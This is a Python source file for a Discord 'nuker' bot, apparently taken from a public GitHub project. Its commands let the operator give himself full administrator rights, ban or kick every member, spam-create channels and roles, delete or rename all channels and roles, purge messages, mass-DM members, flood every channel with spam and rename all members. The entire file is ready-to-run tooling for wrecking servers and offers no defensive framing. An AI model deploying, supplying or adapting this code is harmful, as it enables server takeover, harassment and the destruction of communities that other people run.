import discord
from discord.ext import commands
import string
import random
from datetime import datetime

TOKEN = ''
AUTHOR_ID =

client = commands.Bot(
    command_prefix='.',
    case_insensitive=True
)
client.remove_command('help')


def allowed(ctx):
    return ctx.author.id == AUTHOR_ID


@client.event
async def on_ready():
    await client.change_presence(
        status=discord.Status.dnd,
        activity=discord.Game('NUKING SERVERS')
    )
    print(
        f'\nLogged in as {client.user.name}#{client.user.discriminator},',
        f'User ID: {client.user.id}, Version: {discord.__version__}\n',
        f'DISCORD BOT WRITTEN BY GHOST_BOI: https://github.com/Ghost-Boi/ghost-discord-nuker\n'
    )


@client.event
async def on_guild_join(ctx):
    now = datetime.now()
    print(now, ': Nuker Bot was added to', ctx)


@client.event
async def on_guild_remove(ctx):
    now = datetime.now()
    print(now, ': Nuker Bot was removed from', ctx)


@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        now = datetime.now()
        dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
        print(dt_string, ':', ctx.message.author, 'attempted to execute:', ctx.message.content, 'in', ctx.guild)
        await ctx.message.delete()
        await ctx.send('🚫 **Permission Denied!**')
    if isinstance(error, commands.NotOwner):
        now = datetime.now()
        dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
        print(dt_string, ':', ctx.message.author, 'attempted to execute:', ctx.message.content, 'in', ctx.guild)
        await ctx.message.delete()
        await ctx.send('🚫 **You are not the owner!**')
    if isinstance(error, commands.CheckFailure):
        now = datetime.now()
        dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
        print(dt_string, ':', ctx.message.author, 'attempted to execute:', ctx.message.content, 'in', ctx.guild)
        await ctx.message.delete()
        await ctx.send('🚫 **Access Denied!**')
    else:
        print(error)


@client.command()
@commands.check(allowed)
async def help(ctx):
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    print(dt_string, ':', ctx.author, 'executed: .help in', ctx.guild)
    embedVar = discord.Embed(title="Commands", description="All Nuker Commands", color=0x00ff00)
    embedVar.add_field(name="Prefix", value="'.'", inline=False)
    embedVar.add_field(name="Author", value="Determined on line 12.", inline=False)
    embedVar.add_field(name=".admin", value="Grants the Author Administrator Permissions.", inline=False)
    embedVar.add_field(name=".ban", value="Bans Everyone from the Server Except from the Author and the Owner.",
                       inline=False)
    embedVar.add_field(name=".channel", value="Sub Commands:", inline=False)
    embedVar.add_field(name=".channel create", value="Will Spam Create Channels.", inline=False)
    embedVar.add_field(name=".channel rename", value="Will Rename All Channels with Random Names.", inline=False)
    embedVar.add_field(name=".channel delete", value="Will Delete All Channels.", inline=False)
    embedVar.add_field(name=".dm [Message]", value="Direct Messages Everyone in the Server with [Message].",
                       inline=False)
    embedVar.add_field(name=".kick", value="Kicks Everyone from the Server Except from the Author.", inline=False)
    embedVar.add_field(name=".nickname",
                       value="Nicknames Everyone in the Server to a Random String Except the Author and the Owner.",
                       inline=False)
    embedVar.add_field(name=".purge", value="Deletes Messages in  all Channels.", inline=False)
    embedVar.add_field(name=".role", value="Sub Commands:", inline=False)
    embedVar.add_field(name=".role create", value="Will Spam Create Roles.", inline=False)
    embedVar.add_field(name=".role rename", value="Will Rename All Roles.", inline=False)
    embedVar.add_field(name=".role delete", value="Will Delete All Roles.", inline=False)
    embedVar.add_field(name=".spam [Message]", value="Spams [Message] in the Current Channel Until Stopped.",
                       inline=False)
    await ctx.send(embed=embedVar)


@client.command()
@commands.check(allowed)
async def admin(ctx):
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    print(dt_string, ':', ctx.author, 'executed: .admin in', ctx.guild)
    await ctx.message.delete()
    await ctx.guild.create_role(
        name='Hacker',
        permissions=discord.Permissions.all()
    )
    role = discord.utils.get(ctx.guild.roles, name='Hacker')
    await ctx.author.add_roles(role)
    await ctx.send('✅ **Role Created!**')


@client.command()
@commands.check(allowed)
async def ban(ctx):
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    print(dt_string, ':', ctx.author, 'executed: .ban in', ctx.guild)
    await ctx.message.delete()
    await ctx.send('🔨 **Banning all members!**')
    for member in ctx.guild.members:
        try:
            if member != ctx.author:
                await member.ban()
            else:
                continue
        except discord.Forbidden:
            continue


@client.command()
@commands.check(allowed)
async def kick(ctx):
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    print(dt_string, ':', ctx.author, 'executed: .kick in', ctx.guild)
    await ctx.message.delete()
    await ctx.send('👢 **Roundhouse kicking all members!**')
    for member in ctx.guild.members:
        try:
            if member != ctx.author:
                await member.kick()
            else:
                continue
        except discord.Forbidden:
            continue


@client.command()
@commands.check(allowed)
async def channel(ctx, choice):
    await ctx.message.delete()
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    if choice == 'create':
        print(dt_string, ':', ctx.author, 'executed: .channel create in', ctx.guild)
        await ctx.send('✅ **Mitosis (channels)!** Type `stop` to stop.')

        def check_reply(m):
            return m.content == 'stop' and m.author == ctx.author

        async def spam_create_channels():
            while True:
                await ctx.guild.create_text_channel('NUKED')
                await ctx.guild.create_voice_channel('NUKED')

        spam_channel_task = client.loop.create_task(spam_create_channels())
        await client.wait_for('message', check=check_reply)
        spam_channel_task.cancel()
        await ctx.send('✅ **Mitosis complete!**')

    elif choice == 'delete':
        print(dt_string, ':', ctx.author, 'executed: .channel delete in', ctx.guild)
        await ctx.send('✅ **Purging channels!**')
        for chan in ctx.guild.channels:
            await chan.delete()

    elif choice == 'rename':
        print(dt_string, ':', ctx.author, 'executed: .channel rename in', ctx.guild)
        await ctx.send('✅ **Renaming channels!**')
        char = string.ascii_letters + string.digits
        for chan in ctx.guild.channels:
            chan_name = ''.join((random.choice(char) for i in range(16)))
            await chan.edit(name=chan_name)

    else:
        await ctx.send('🚫 **Invalid option!**')
        print('.channel 🚫 Invalid option!')


@client.command()
@commands.check(allowed)
async def dm(ctx, *, msg=None):
    await ctx.message.delete()
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    print(dt_string, ':', ctx.author, 'executed: .dm', msg, 'in', ctx.guild)
    if msg is not None:
        await ctx.send('✅ **Attempting to DM everyone!**')
        for member in ctx.guild.members:
            if member != ctx.guild.me:
                try:
                    if member.dm_channel is None:
                        await member.create_dm()
                    await member.dm_channel.send(msg)
                except discord.Forbidden:
                    continue
            else:
                continue
        await ctx.send('✅ **Sliding into DMs complete!**')
    else:
        await ctx.send('🚫 **I cannot send an empty message!**')
        print('.dm 🚫 I cannot send an empty message!')


@client.command()
@commands.check(allowed)
async def purge(ctx):
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    print(dt_string, ':', ctx.author, 'executed: .purge in', ctx.guild)
    for tc in ctx.guild.text_channels:
        await tc.purge(bulk=True)
    await ctx.send('✅ **Purged all channels!**')


@client.command()
@commands.check(allowed)
async def role(ctx, choice):
    await ctx.message.delete()
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    if choice == 'create':
        print(dt_string, ':', ctx.author, 'executed: .role create in', ctx.guild)
        await ctx.send('✅ **Mitosis (roles)!** Type `stop` to stop.')

        def check_reply(m):
            return m.content == 'stop' and m.author == ctx.author

        async def spam_create_roles():
            while True:
                await ctx.guild.create_role(name='NUKED')

        spam_role_task = client.loop.create_task(spam_create_roles())
        await client.wait_for('message', check=check_reply)
        spam_role_task.cancel()
        await ctx.send('✅ **Mitosis complete!**')

    elif choice == 'delete':
        print(dt_string, ':', ctx.author, 'executed: .role delete in', ctx.guild)
        await ctx.send('✅ **Purging roles!**')
        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            if ctx.guild.me.roles[-1] > role:
                await role.delete()
            else:
                break

    elif choice == 'rename':
        print(dt_string, ':', ctx.author, 'executed: .role rename in', ctx.guild)
        await ctx.send('✅ **Renaming roles!**')
        char = string.ascii_letters + string.digits
        for role in ctx.guild.roles:
            if ctx.guild.me.roles[-1] > role:
                role_name = ''.join((random.choice(char) for i in range(16)))
                await role.edit(name=role_name)
            else:
                break

    else:
        await ctx.send('🚫 **Invalid option!**')
        print('.role 🚫 Invalid option!')


@client.command()
@commands.check(allowed)
async def spam(ctx, *, msg=None):
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    print(dt_string, ':', ctx.author, 'executed: .spam', msg, 'in', ctx.guild)
    await ctx.message.delete()
    if msg is not None:
        await ctx.send('✅ **Spamming initiated!** Type `stop` to stop.')

        def check_reply(m):
            return m.content == 'stop' and m.author == ctx.author

        async def spam_text():
            while True:
                for tc in ctx.guild.text_channels:
                    await tc.send(msg)

        spam_text_task = client.loop.create_task(spam_text())
        await client.wait_for('message', check=check_reply)
        spam_text_task.cancel()
        await ctx.send('✅ **Spamming complete!**')
    else:
        await ctx.send('🚫 **I cannot send an empty message!**')
        print('.spam 🚫 I cannot send an empty message!')


@client.command()
@commands.check(allowed)
async def nickname(ctx):
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    print(dt_string, ':', ctx.author, 'executed: .nickname in', ctx.guild)
    await ctx.message.delete()
    char = string.ascii_letters + string.digits
    for member in ctx.guild.members:
        nickname = ''.join((random.choice(char) for i in range(16)))
        try:
            await member.edit(nick=nickname)
        except discord.Forbidden:
            continue
    await ctx.send('✅ **Nicknamed everyone!**')


@client.command()
@commands.check(allowed)
async def logout(ctx):
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    print(dt_string, ':', ctx.author, 'executed: .logout in', ctx.guild)
    await client.logout()


client.run(TOKEN)
